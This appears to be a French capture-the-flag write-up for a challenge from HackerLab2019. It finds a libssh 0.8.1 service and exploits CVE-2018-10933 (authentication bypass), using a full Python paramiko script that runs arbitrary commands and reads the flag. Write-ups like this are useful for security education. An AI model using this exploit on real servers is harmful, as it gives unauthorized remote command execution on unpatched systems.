* * *
# Rooter
> (Miscellaneous, 300 points )
---
## Challenge :
> 51.91.120.156
30000

Pour ce challenge, nous avions en description une adresse ip et un port (**51.91.120.156 30000**). On devra donc lancer une connexion sur cette adresse pour voir l'objectif réel de l'épreuve.
```console
root@Y3HW3_H4CK3R:~/HackerLab2019# nc 51.91.120.156 30000
SSH-2.0-libssh_0.8.1

root@Y3HW3_H4CK3R:~/HackerLab2019#
```
Des recherches effectuées sur la sortie de la commande précédente, nous renvois au **CVE-2018-10933 (libSSH - Authentication Bypass)**. L'idée serait donc de **bypasser l'authentification**, pour pourvoir **exécuter des commandes systèmes**, nous permettant d'extraire le ```flag```. Pour mener à bien cette exploitation ,  nous avions customisé un **script python**.

```python
import sys
import paramiko
import socket

s = socket.socket()
s.connect(("51.91.120.156",30000))
m = paramiko.message.Message()
t = paramiko.transport.Transport(s)
t.start_client()
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c = t.open_session(timeout=5)
c.exec_command(sys.argv[1])
out = c.makefile("rb",2048)
output = out.read()
out.close()
print (output)

```
Enregistrons notre script sous le nom ```libssh.py```
```console
root@Y3HW3_H4CK3R:~/HackerLab2019# python libssh.py ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
ssh_server_fork.patch
sys
tmp
usr
var
root@Y3HW3_H4CK3R:~/HackerLab2019# python libssh.py "cat flag.txt"
CTF_SSH_Exploiter
```

```Flag : ``` **CTF_SSH_Exploiter**